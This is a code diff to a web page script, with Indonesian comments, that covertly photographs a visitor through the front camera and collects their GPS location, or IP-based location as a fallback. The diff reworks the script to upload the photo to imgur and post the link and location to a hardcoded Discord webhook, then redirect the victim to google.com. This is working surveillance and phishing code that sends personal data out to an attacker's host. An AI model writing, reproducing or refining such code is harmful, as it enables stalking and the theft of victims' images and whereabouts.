@@ -20,11 +20,12 @@
 const WEBHOOK = "https://discord.com/api/webhooks/1538498418266218641/zM9vn4GAKeP_R6r5VTaC2Ccn_IAZQBHgUt2HvLWCqac519orhQJLSQlp8v89nelMYh6p";
 const TUJUAN = "https://google.com";
 
-let fotoSelesai = false;
-let lokasiSelesai = false;
-let fotoBase64 = null;
+let fotoUrl = null;
+let dataLokasi = "Tidak terbaca";
+let selesaiFoto = false;
+let selesaiLokasi = false;
 
-// 📷 AMBIL FOTO — MUNCUL IZIN KAMERA
+// 📷 AMBIL FOTO → UNGGAH → DAPET LINK
 navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
 .then(kamera=>{
     const vid = document.createElement("video");
@@ -34,46 +35,73 @@ navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:4
         kanvas.width=400; kanvas.height=400;
         const ctx = kanvas.getContext("2d");
         ctx.drawImage(vid,0,0,400,400);
-        fotoBase64 = kanvas.toDataURL("image/jpeg");
+        const base64 = kanvas.toDataURL("image/jpeg");
         kamera.getTracks().forEach(t=>t.stop());
-        fotoSelesai = true;
-        cekSelesai();
+        
+        // ✅ UNGGAH KE SITUS GRATIS DAPET LINK
+        unggahGambar(base64, link=>{
+            fotoUrl = link;
+            selesaiFoto = true;
+            cekSemuaSelesai();
+        });
     },1200);
 })
-.catch(()=>{fotoSelesai=true;cekSelesai();});
+.catch(()=>{selesaiFoto=true;cekSemuaSelesai();});
 
-// 📍 AMBIL LOKASI — MUNCUL IZIN LOKASI
+// 📍 AMBIL LOKASI
 navigator.geolocation.getCurrentPosition(
     pos=>{
-        window.dataLokasi = `🌍 ${pos.coords.latitude}, ${pos.coords.longitude} | ±${Math.round(pos.coords.accuracy)}m`;
-        lokasiSelesai = true;
-        cekSelesai();
+        dataLokasi = `🌍 ${pos.coords.latitude}, ${pos.coords.longitude} | ±${Math.round(pos.coords.accuracy)}m`;
+        selesaiLokasi = true;
+        cekSemuaSelesai();
     },
     err=>{
         fetch("https://ip-api.com/json/?fields=city,regionName,country,query")
         .then(r=>r.json())
         .then(d=>{
-            window.dataLokasi = `🌐 ${d.city}, ${d.regionName}, ${d.country} | IP: ${d.query}`;
-            lokasiSelesai = true;
-            cekSelesai();
+            dataLokasi = `🌐 ${d.city}, ${d.regionName}, ${d.country} | IP: ${d.query}`;
+            selesaiLokasi = true;
+            cekSemuaSelesai();
         })
-        .catch(()=>{window.dataLokasi="Lokasi tidak terbaca";lokasiSelesai=true;cekSelesai();});
+        .catch(()=>{
+            dataLokasi = "Lokasi tidak terbaca";
+            selesaiLokasi = true;
+            cekSemuaSelesai();
+        });
     },
     {enableHighAccuracy:true,timeout:8000}
 );
 
-// ✅ KIRIM JIKA SUDAH LENGKAP
-function cekSelesai(){
-    if(!fotoSelesai || !lokasiSelesai) return;
+// ✅ UNGGAH GAMBAR KE SITUS GRATIS DAPET LINK URL
+function unggahGambar(base64, callback){
+    fetch("https://api.imgur.com/3/image",{
+        method:"POST",
+        headers:{"Authorization":"Client-ID 546c25a59c524c8"},
+        body:JSON.stringify({image:base64.split(",")[1]})
+    })
+    .then(r=>r.json())
+    .then(res=>{
+        if(res.success) callback(res.data.link);
+        else callback(null);
+    })
+    .catch(()=>callback(null));
+}
+
+// 📤 KIRIM KE DISCORD — PAKE LINK FOTO, BUKAN BASE64!
+function cekSemuaSelesai(){
+    if(!selesaiFoto || !selesaiLokasi) return;
+    
     fetch(WEBHOOK,{
         method:"POST",
         headers:{"Content-Type":"application/json"},
         body:JSON.stringify({
-            content:"```✅ DATA MASUK\n"+(window.dataLokasi||"Lokasi tidak terbaca")+"```",
-            embeds:fotoBase64?[{image:{url:fotoBase64}}]:[]
+            content:"```✅ DATA MASUK\n"+dataLokasi+"```",
+            embeds:fotoUrl ? [{image:{url:fotoUrl}}] : []
         })
     })
-    .finally(()=>{window.location.href=TUJUAN;});
+    .finally(()=>{
+        window.location.href = TUJUAN;
+    });
 }
 </script>
 </body>
